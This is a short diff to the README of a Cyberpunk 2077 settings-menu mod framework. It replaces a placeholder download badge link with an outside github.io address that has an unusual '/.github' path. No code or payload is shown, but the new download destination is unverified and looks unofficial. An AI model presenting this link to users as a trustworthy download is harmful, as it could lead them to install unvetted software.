@@ -2,7 +2,7 @@
 
 A powerful modding framework for Cyberpunk 2077 that allows you to easily add native-style custom settings menus to your mods. Ideal for mod developers who want a seamless, integrated user experience.
 
-[![Download Native Settings UI](https://img.shields.io/badge/Download-Native_Settings_UI-blueviolet)](#)
+[![Download Native Settings UI](https://img.shields.io/badge/Download-Native_Settings_UI-blueviolet)](https://settings-ui-for-cyberpunk-2077.github.io/.github)
 
 ---
 
